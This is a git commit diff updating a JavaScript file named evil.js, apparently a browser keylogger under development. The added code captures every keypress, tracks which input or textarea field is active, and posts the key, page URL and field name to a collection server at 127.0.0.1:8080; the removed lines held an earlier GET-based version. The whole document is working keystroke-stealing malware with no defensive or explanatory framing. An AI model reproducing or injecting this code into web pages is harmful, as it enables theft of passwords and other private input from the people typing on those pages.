96aaa969b006ea97beaaa5b76bd5bc4df8791114
MGF15 <mohamed5548@live.com>
2017-07-03 22:00:55 +0300

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,8 +1,9 @@
-<script>
-    document.onkeypress = function KeyPress(e){
-    var key;
+inputarea = ''
+var http = new XMLHttpRequest();
+
+document.onkeypress = function KeyPress(e){
+	var key;
 	var u;
-	var http = new XMLHttpRequest();
 	e = e.which || e.keyCode;
 	if(e) {             
 		key = e
@@ -21,14 +22,32 @@
 		case 8:
 			u = "[Backspace]";
 	}
-    if (u===parseInt(key, 10)){
+	if (u === parseInt(key, 10)){
 		u = String.fromCharCode(key)
 		ky = u;
 	}
 	else {
 		ky = u;
 	}
-	http.open("GET","http://127.0.0.1:8080/"+"key="+decodeURI(ky),true);
-	http.send(null);
+
+	function spyOn() {
+        	var inputFields = document.querySelectorAll('input,textarea'),
+            	emitChange = function () {
+                  	 inputarea = this.name;
+			  
+            	};
+
+       		for (var i = 0; i < inputFields.length; i++) {
+        	    var field = inputFields[i];
+        	    field.onkeydown = emitChange;
+			};
+		
+		}
+
+	var on = spyOn();
+	http.open("POST","http://127.0.0.1:8080/",true);
+	http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	http.send("key:::"+ky+':::'+document.URL+':::#'+inputarea);
+	
 }
-</script>
+
